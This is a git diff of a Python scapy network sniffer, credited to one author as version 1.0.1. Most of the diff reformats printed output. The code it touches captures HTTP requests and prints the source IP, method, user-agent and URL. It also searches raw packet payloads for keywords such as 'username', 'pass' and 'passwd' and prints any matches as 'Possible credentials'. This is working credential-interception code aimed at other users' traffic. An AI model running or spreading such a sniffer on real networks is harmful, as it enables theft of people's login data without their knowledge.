@@ -30,21 +30,23 @@ def sniff(interface):
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):  # check if a packet contains any layers (http)
-        print(Fore.RESET + "Requested from: " + packet[scapy.IP].src)
+        print(Fore.RESET + f"==============================================================================")
+        print(Fore.RESET + "* Method Type ==> " + str(packet[http.HTTPRequest].Method, encoding="UTF-8"))
+        print(Fore.RESET + "* Requested from ==> " + packet[scapy.IP].src)
         # print(packet.show())
         url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(Fore.RESET + "User-Agent: " + str(packet[http.HTTPRequest].User_Agent, encoding="UTF-8"))
-        print(Fore.RESET + "URL: " + str(packet[http.HTTPRequest].Method, encoding="UTF-8") + " - " + 
-              str(url, encoding="UTF-8") + " is at " + str(packet[scapy.IP].dst))
+        print(Fore.RESET + "* User-Agent ==> " + str(packet[http.HTTPRequest].User_Agent, encoding="UTF-8"))
+        print(Fore.RESET + "* URL ==> " + str(url, encoding="UTF-8") + " is at " + str(packet[scapy.IP].dst))
 
         if packet.haslayer(scapy.Raw):  # check if a packet contains any layers (raw)
             load = str(packet[scapy.Raw].load)
             keywords = ['uname', 'username', 'login', 'usr', 'usrname', 'pass', 'email', 'password', 'passwd']
             for keyword in keywords:
                 if keyword in load:
-                    print(Fore.YELLOW + "\n[+] Possible credentials ==> " + load + "\n")
+                    print(Fore.YELLOW + "* Possible credentials ==> " + load)
                     break
-        print("\n\n")
+        print(Fore.RESET + f"==============================================================================")
+        print("\n")
 
 
 print('\nNetwork packet sniffer, developed and coded by Saher Muhamed - version 1.0.1\n')
